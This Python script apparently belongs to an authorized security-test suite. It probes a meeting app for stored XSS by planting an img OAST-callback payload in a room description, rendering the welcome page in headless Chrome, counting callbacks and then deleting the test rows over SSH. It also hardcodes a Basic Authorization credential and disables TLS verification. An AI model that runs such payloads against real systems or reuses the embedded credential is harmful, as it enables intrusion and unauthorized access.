"""V8 P1：房间名存储型 XSS sink 检测（欢迎页渲染 + OAST）。
创建 secauto 测试房间（房间名含 img OAST payload），用浏览器打开 welcome 页面，
检查原始 payload 是否被渲染/转义，并检查 OAST 回调；结束后 DB 清理。
"""
import sys as _sys
from pathlib import Path as _Path
_sys.path.insert(0, str(_Path(__file__).resolve().parents[1]))
from runner import public_config as _pub
import json
import os
import random
import time
import requests
import urllib3
urllib3.disable_warnings()
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BASE = _pub.target()
OUT = os.path.join(ROOT, 'reports', 'final', 'xss_room_sink.json')
CHROME = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'

def token():
    return open(os.path.join(ROOT, 'evidence', 'tokens', 'admin02.txt'), encoding='utf-8').read().strip()

def post(path, body):
    h = {'Origin': BASE, 'Referer': BASE + '/ui/login', 'User-Agent': 'Mozilla/5.0', 'token': token(), 'Content-Type': 'application/json'}
    r = requests.post(BASE + path, headers=h, params={'t': str(int(time.time() * 1000))}, json=body, timeout=20, verify=False)
    try:
        return (r.status_code, r.json())
    except Exception:
        return (r.status_code, {'raw': r.text[:200]})

def main():
    oast = json.load(open(os.path.join(ROOT, 'adapters', 'oast', 'oast_state.json'), encoding='utf-8'))
    domain = oast['domain']
    tok = 'xssroom' + str(random.randint(100000, 999999))
    payload = f'<img src="http://{tok}.{domain}/x">'
    room = f'xssroom{int(time.time()) % 100000}'
    h = {'Origin': BASE, 'Referer': BASE + '/ui/login', 'User-Agent': 'Mozilla/5.0', 'token': token()}
    r = requests.get(BASE + '/meeting/v1/roominfo/default', headers=h, params={'t': str(int(time.time() * 1000))}, timeout=20, verify=False)
    try:
        j = r.json()
    except Exception:
        j = {'raw': r.text[:200]}
    template = (j or {}).get('data') or {}
    body = dict(template)
    body.update({'roomName': room, 'roomDesc': payload})
    (st, j) = post('/meeting/v1/roominfo/add', body)
    res = {'generated_at': time.strftime('%Y-%m-%dT%H:%M:%S'), 'token': tok, 'payload': payload, 'room': room, 'create_http': st, 'create_code': (j or {}).get('code'), 'create_msg': (j or {}).get('msg'), 'rendered_raw': False, 'escaped': False, 'oast_hits': 0, 'welcome_url': None, 'page_log': []}
    if res['create_code'] != '0':
        json.dump(res, open(OUT, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
        print('create failed:', res['create_code'], res['create_msg'])
        return
    (st, j) = post('/meeting/v1/roominfo/page', {'pageNumber': 1, 'pageSize': 200})
    rid = None
    for rec in ((j or {}).get('data') or {}).get('records') or []:
        if rec.get('roomName') == room:
            rid = rec.get('roomID')
            break
    res['roomID'] = rid
    if not rid:
        json.dump(res, open(OUT, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
        print('room id not found')
        return
    tr = 'Basic ZTU2ZGNlNjEtOTg4MS00YzRlLTg2NzItY2E4YjkzM2ZjZjNhOmRlOWZkZmE5LTdjZTYtNDAzNy1hMzQzLTE5OGQzMTMyY2M0Nw=='
    r = requests.get(BASE + f'/meeting-resource-server/open/rooms/share/{rid}', headers={'Authorization': tr, 'User-Agent': 'Mozilla/5.0', 'Origin': BASE, 'Referer': BASE + '/webapp/'}, timeout=20, verify=False)
    try:
        share = r.json()
        res['welcome_url'] = (share.get('result') or {}).get('meetingURL')
    except Exception:
        share = {}
    try:
        from playwright.sync_api import sync_playwright
        url = res['welcome_url']
        with sync_playwright() as p:
            b = p.chromium.launch(headless=True, executable_path=CHROME, args=['--no-sandbox', '--ignore-certificate-errors'])
            pg = b.new_page(ignore_https_errors=True)
            if url:
                pg.goto(url, timeout=45000, wait_until='domcontentloaded')
                time.sleep(3)
            else:
                pg.goto(BASE + '/webapp/', timeout=45000, wait_until='domcontentloaded')
                time.sleep(2)
            html = pg.content()
            res['rendered_raw'] = payload in html or '"http://%s' % tok in html
            res['escaped'] = '&lt;img' in html.lower()
            res['page_log'].append({'url': pg.url, 'title': pg.title()[:80], 'html_len': len(html)})
            b.close()
    except Exception as e:
        res['page_error'] = str(e)[:300]
    time.sleep(8)
    jsonl = os.path.join(ROOT, 'tools_cache', 'interactsh', 'interactions.jsonl')
    if os.path.exists(jsonl):
        for line in open(jsonl, encoding='utf-8', errors='replace'):
            if tok in line:
                res['oast_hits'] += 1
    try:
        import paramiko
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(_pub.env('SEC_SSH_HOST', ''), 22, _pub.env('SEC_SSH_USER'), _pub.env('SEC_SSH_PASSWORD', ''), timeout=10)
        sql = "DELETE FROM t_roomusers WHERE roomID IN (SELECT roomID FROM t_roominfo WHERE roomName LIKE 'xssroom%');DELETE FROM t_roominfo WHERE roomName LIKE 'xssroom%';"
        cmd = 'docker exec hst-mysql mysql -h192.168.7.155 -P22007 ' + ('-u' + _pub.shell('SEC_DB_USER')) + ' -' + _pub.shell('SEC_TEST_PASSWORD') + ' --ssl-mode=REQUIRED fastmeeting -N -e ' + json.dumps(sql) + ' 2>/dev/null'
        (i, o, e) = c.exec_command(cmd, timeout=60)
        o.read()
        c.close()
        res['cleanup'] = True
    except Exception as e:
        res['cleanup'] = False
        res['cleanup_error'] = str(e)[:200]
    json.dump(res, open(OUT, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
    print(json.dumps({k: res.get(k) for k in ('create_code', 'roomID', 'rendered_raw', 'escaped', 'oast_hits', 'page_error')}, ensure_ascii=False))
if __name__ == '__main__':
    main()
